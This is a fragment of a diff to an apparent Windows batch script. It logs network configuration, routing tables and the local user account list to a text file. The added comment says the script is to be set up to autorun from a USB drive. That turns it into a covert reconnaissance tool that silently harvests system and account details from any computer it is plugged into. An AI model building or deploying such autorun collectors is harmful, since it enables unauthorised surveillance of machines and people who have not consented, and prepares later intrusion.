@@ -19,3 +19,7 @@ ipconfig -all >> logfile.txt
 route print >> logfile.txt
 net user >> logfile.txt
 exit
+
+
+
+// make it and set with autorun usb 
